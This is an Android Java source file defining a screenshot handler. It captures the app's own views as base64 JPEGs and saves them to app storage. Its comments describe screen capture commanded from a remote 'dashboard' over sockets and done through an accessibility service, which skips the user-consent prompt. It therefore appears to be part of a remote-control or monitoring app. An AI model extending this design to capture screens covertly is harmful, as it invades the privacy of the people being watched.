package com.task.tusker.commands;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.util.Base64;
import android.view.View;
import android.os.Build;
import com.task.tusker.services.UnifiedAccessibilityService;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;

/**
 * Screenshot Handler - Capture screen
 * Note: AccessibilityService-based screenshots are handled in the accessibility service process.
 * This class handles view screenshots (app's own views) and MediaProjection screenshots.
 */
public class ScreenshotHandler {

    private Context context;

    public ScreenshotHandler(Context context) {
        this.context = context;
    }

    /**
     * Take one screenshot through the running accessibility service.
     * NOTE: This method is deprecated for cross-process use.
     * The 'take_screenshot' command is now handled in the accessibility service process
     * via SocketManager.handleAccessibilityCommand().
     * This method returns an error directing to use the dashboard command.
     */
    public JSONObject takeScreenshot() {
        JSONObject result = new JSONObject();
        try {
            result.put("success", false);
            result.put("error", "Accessibility screenshots must be requested via the dashboard command which routes to the accessibility service process. Use 'take_screenshot' command from dashboard.");
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return result;
    }

    /**
     * Attempt to return a Bitmap for streaming. Returns null if unavailable
     * (MediaProjection API requires explicit user grant — use AccessibilityService instead).
     */
    public Bitmap captureBitmap() {
        return null; // MediaProjection requires user consent at runtime; use AccessibilityService.captureScreenSync()
    }

    /**
     * Capture view screenshot (for app's own views only)
     */
    public JSONObject captureView(View view) {
        JSONObject result = new JSONObject();
        
        try {
            view.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(view.getDrawingCache());
            view.setDrawingCacheEnabled(false);

            String base64 = bitmapToBase64(bitmap, 80);
            String filePath = saveBitmapToFile(bitmap, "screenshot_" + System.currentTimeMillis() + ".jpg");

            result.put("success", true);
            result.put("base64", base64);
            result.put("filePath", filePath);
            result.put("width", bitmap.getWidth());
            result.put("height", bitmap.getHeight());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Convert bitmap to base64
     */
    private String bitmapToBase64(Bitmap bitmap, int quality) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        return Base64.encodeToString(byteArray, Base64.NO_WRAP);
    }

    /**
     * Save bitmap to file
     */
    private String saveBitmapToFile(Bitmap bitmap, String filename) {
        try {
            File ssDir = new File(context.getFilesDir(), "screenshots");
            if (!ssDir.exists()) ssDir.mkdirs();
            File file = new File(ssDir, filename);
            FileOutputStream fos = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
            fos.close();
            return file.getAbsolutePath();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
